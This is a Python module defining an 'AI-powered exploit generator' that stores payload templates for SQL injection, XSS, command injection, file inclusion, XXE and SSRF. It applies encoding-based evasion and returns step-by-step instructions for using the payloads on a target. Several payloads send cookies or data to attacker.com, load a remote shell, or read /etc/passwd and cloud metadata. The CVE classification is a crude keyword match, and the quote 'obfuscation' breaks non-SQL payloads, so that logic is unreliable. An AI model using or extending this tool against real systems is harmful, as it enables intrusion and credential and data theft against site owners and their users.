"""
AI-powered exploit generation system with contextual intelligence.

This module changes when exploit generation or AI strategies change.
"""

import logging
import time
from typing import Dict, Any, List

logger = logging.getLogger(__name__)

class AIExploitGenerator:
    """AI-powered exploit generation system with contextual intelligence"""
    
    def __init__(self):
        self.exploit_templates = {
            "sql_injection": {
                "union_based": [
                    "' UNION SELECT {columns} FROM {table} --",
                    "' UNION ALL SELECT {columns} FROM {table} --",
                    "') UNION SELECT {columns} FROM {table} --"
                ],
                "boolean_based": [
                    "' AND 1=1 --",
                    "' AND 1=2 --",
                    "' OR 1=1 --"
                ],
                "time_based": [
                    "'; WAITFOR DELAY '00:00:05' --",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
                    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --"
                ],
                "error_based": [
                    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
                    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --"
                ]
            },
            "xss": {
                "reflected": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "javascript:alert('XSS')"
                ],
                "stored": [
                    "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
                    "<img src=x onerror=this.src='http://attacker.com/steal.php?cookie='+document.cookie>",
                    "<iframe src=javascript:alert('Stored XSS')></iframe>"
                ],
                "dom_based": [
                    "#<script>alert('DOM XSS')</script>",
                    "javascript:alert('DOM XSS')",
                    "<img src=x onerror=eval(location.hash.slice(1))>"
                ]
            },
            "command_injection": {
                "unix": [
                    "; {command}",
                    "| {command}",
                    "&& {command}",
                    "|| {command}",
                    "`{command}`",
                    "$({command})"
                ],
                "windows": [
                    "& {command}",
                    "| {command}",
                    "&& {command}",
                    "|| {command}"
                ]
            },
            "file_inclusion": {
                "lfi": [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "php://filter/convert.base64-encode/resource={file}",
                    "data://text/plain;base64,{encoded_payload}"
                ],
                "rfi": [
                    "http://attacker.com/shell.txt",
                    "ftp://attacker.com/shell.txt",
                    "data://text/plain;base64,{encoded_shell}"
                ]
            },
            "xxe": [
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo>&send;</foo>'
            ],
            "ssrf": [
                "http://localhost:80",
                "http://127.0.0.1:22",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com"
            ]
        }
        
        self.evasion_techniques = {
            "encoding": {
                "url_encoding": lambda x: ''.join(f'%{ord(c):02x}' for c in x),
                "double_url_encoding": lambda x: ''.join(f'%25{ord(c):02x}' for c in x),
                "html_encoding": lambda x: ''.join(f'&#{ord(c)};' for c in x),
                "unicode_encoding": lambda x: ''.join(f'\\u{ord(c):04x}' for c in x)
            },
            "case_variation": {
                "mixed_case": lambda x: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(x)),
                "random_case": lambda x: ''.join(c.upper() if hash(str(i)) % 2 else c.lower() for i, c in enumerate(x))
            },
            "comment_insertion": {
                "sql_comments": lambda x: x.replace(' ', '/**/ '),
                "html_comments": lambda x: x.replace('<', '<!---->').replace('>', '<!---->'),
                "js_comments": lambda x: x.replace(';', ';//')
            }
        }
        
        self.context_modifiers = {
            "parameter_position": {
                "first": lambda x: x,
                "middle": lambda x: f"&param={x}&",
                "last": lambda x: f"&{x}"
            },
            "quote_context": {
                "single_quoted": lambda x: f"'{x}'",
                "double_quoted": lambda x: f'"{x}"',
                "unquoted": lambda x: x
            },
            "html_context": {
                "attribute": lambda x: f'"{x}"',
                "tag_content": lambda x: f'>{x}<',
                "script_tag": lambda x: f'<script>{x}</script>'
            }
        }
        
        self.risk_levels = {
            "critical": ["remote_code_execution", "sql_injection", "authentication_bypass"],
            "high": ["xss_stored", "file_upload", "privilege_escalation"],
            "medium": ["xss_reflected", "information_disclosure", "csrf"],
            "low": ["directory_traversal", "weak_encryption", "information_leakage"]
        }
    
    def generate_exploit_from_cve(self, cve_id: str, target_info: Dict[str, Any] = None) -> Dict[str, Any]:
        """Generate contextual exploit based on CVE information"""
        try:
            vuln_type = self._classify_vulnerability(cve_id)
            
            template = self._select_template(vuln_type, target_info)
            
            # Generate exploit parameters
            exploit_params = self._generate_exploit_parameters(vuln_type, target_info)
            
            evasive_payload = self._apply_evasion_techniques(template, exploit_params)
            
            usage_instructions = self._generate_usage_instructions(vuln_type, evasive_payload)
            
            return {
                "success": True,
                "cve_id": cve_id,
                "vulnerability_type": vuln_type,
                "exploit_payload": evasive_payload,
                "parameters": exploit_params,
                "usage_instructions": usage_instructions,
                "risk_level": self._assess_risk_level(vuln_type),
                "recommendations": self._get_recommendations(vuln_type)
            }
            
        except Exception as e:
            logger.error(f"❌ Exploit generation failed for {cve_id}: {str(e)}")
            return {"success": False, "error": str(e)}
    
    def _classify_vulnerability(self, cve_id: str) -> str:
        """Classify vulnerability type from CVE ID"""
        # In a real implementation, this would query CVE databases
        classification_map = {
            "sql": "sql_injection",
            "xss": "xss",
            "rce": "command_injection",
            "lfi": "file_inclusion",
            "xxe": "xxe",
            "ssrf": "ssrf"
        }
        
        cve_lower = cve_id.lower()
        for keyword, vuln_type in classification_map.items():
            if keyword in cve_lower:
                return vuln_type
        
        return "sql_injection"
    
    def _select_template(self, vuln_type: str, target_info: Dict[str, Any] = None) -> str:
        """Select appropriate exploit template"""
        templates = self.exploit_templates.get(vuln_type, {})
        
        if isinstance(templates, dict):
            if target_info and "database" in target_info:
                db_type = target_info["database"].lower()
                if "mysql" in db_type and "union_based" in templates:
                    return templates["union_based"][0]
                elif "postgresql" in db_type and "error_based" in templates:
                    return templates["error_based"][0]
            
            first_subtype = list(templates.keys())[0]
            return templates[first_subtype][0]
        else:
            return templates[0] if templates else ""
    
    def _generate_exploit_parameters(self, vuln_type: str, target_info: Dict[str, Any] = None) -> Dict[str, Any]:
        """Generate context-specific exploit parameters"""
        params = {
            "timestamp": int(time.time()),
            "target_os": target_info.get("os", "unknown") if target_info else "unknown",
            "target_app": target_info.get("application", "unknown") if target_info else "unknown"
        }
        
        if vuln_type == "sql_injection":
            params.update({
                "columns": "1,2,3,4,5",
                "table": "information_schema.tables",
                "database": target_info.get("database", "mysql") if target_info else "mysql"
            })
        elif vuln_type == "command_injection":
            params.update({
                "command": "whoami" if params["target_os"] != "windows" else "echo %USERNAME%"
            })
        elif vuln_type == "file_inclusion":
            params.update({
                "file": "/etc/passwd" if params["target_os"] != "windows" else "C:\\windows\\system32\\drivers\\etc\\hosts"
            })
        
        return params
    
    def _apply_evasion_techniques(self, template: str, params: Dict[str, Any]) -> str:
        """Apply evasion techniques to the exploit payload"""
        payload = template.format(**params) if params else template
        
        payload = self._advanced_obfuscation(payload)
        
        return payload
    
    def _advanced_obfuscation(self, payload: str) -> str:
        """Apply advanced obfuscation techniques"""
        obfuscated = payload.replace("'", "CHAR(39)")
        obfuscated = obfuscated.replace('"', "CHAR(34)")
        
        return obfuscated
    
    def _generate_usage_instructions(self, vuln_type: str, payload: str) -> List[str]:
        """Generate step-by-step usage instructions"""
        instructions = [
            f"1. Identify vulnerable parameter in target application",
            f"2. Replace parameter value with: {payload[:100]}{'...' if len(payload) > 100 else ''}",
            f"3. Submit request and analyze response",
            f"4. Look for signs of successful {vuln_type} exploitation"
        ]
        
        if vuln_type == "sql_injection":
            instructions.extend([
                "5. Check for database error messages",
                "6. Verify data extraction in response",
                "7. Escalate to full database enumeration if successful"
            ])
        elif vuln_type == "xss":
            instructions.extend([
                "5. Check if payload executes in browser",
                "6. Verify JavaScript execution context",
                "7. Develop full XSS exploit chain"
            ])
        
        return instructions
    
    def _assess_risk_level(self, vuln_type: str) -> str:
        """Assess risk level of vulnerability type"""
        for level, types in self.risk_levels.items():
            if vuln_type in types:
                return level
        return "medium"  # Default risk level
    
    def _get_recommendations(self, vuln_type: str) -> List[str]:
        """Get remediation recommendations"""
        recommendations = {
            "sql_injection": [
                "Use parameterized queries/prepared statements",
                "Implement input validation and sanitization",
                "Apply principle of least privilege to database accounts",
                "Enable database query logging and monitoring"
            ],
            "xss": [
                "Implement proper output encoding/escaping",
                "Use Content Security Policy (CSP) headers",
                "Validate and sanitize all user inputs",
                "Use secure coding frameworks"
            ],
            "command_injection": [
                "Avoid system command execution with user input",
                "Use safe APIs instead of shell commands",
                "Implement strict input validation",
                "Run applications with minimal privileges"
            ]
        }
        
        return recommendations.get(vuln_type, [
            "Implement proper input validation",
            "Apply security patches regularly",
            "Use security testing tools",
            "Follow secure coding practices"
        ])
